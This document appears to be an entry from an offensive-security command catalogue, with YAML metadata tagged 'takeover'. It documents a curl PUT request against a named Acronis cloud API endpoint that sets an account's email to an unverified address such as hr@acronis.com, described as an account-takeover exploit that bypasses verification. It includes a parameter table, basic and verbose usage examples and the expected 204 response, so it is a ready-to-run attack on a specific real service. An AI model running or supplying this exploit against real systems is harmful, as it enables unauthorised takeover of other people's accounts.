---
id: target-unverified-email-json
data: >-
  curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account -H
  "Content-Type: application/json" -H "Authorization: Bearer <session-token>" -d
  '{"name":"Human Resource","email":"hr@acronis.com"}'
tags:
  - api
  - http-put
  - takeover
type: command
output: HTTP/1.1 204 No Content
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:12.057Z'
verified: false
validated: true
submitted: true
---
# target-unverified-email-json

## Command

```bash
curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <session-token>" \
  -d '{"name":"Human Resource","email":"hr@acronis.com"}'
```

## Description

This command modifies the account JSON payload to target a specific unverified email like hr@acronis.com, demonstrating the takeover exploit in the Acronis API by bypassing verification checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | HTTP method for account update | Yes |
| `-H "Content-Type: application/json"` | JSON body format | Yes |
| `-H "Authorization: Bearer <session-token>"` | Session authentication | Yes |
| `-d '{...}'` | Payload with name and target email | Yes |
| `name` | Display name (e.g., Human Resource) | No |
| `email` | Unverified email for takeover (e.g., hr@acronis.com) | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"name":"Human Resource","email":"hr@acronis.com"}'
```

### Advanced Usage

With verbose output for debugging:

```bash
curl -v -X PUT https://mc-beta-cloud.acronis.com/fc/api/v1/account \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"name":"HR","email":"target@company.com"}'
```

## Expected Output

HTTP 204 No Content on success, confirming the email swap. Errors occur if the email is verified, preventing reuse for takeover.

## Related

- [[commands/modify-account-email-put]]
- [[procedures/Intercept-and-Modify-Email-Change-Request]]
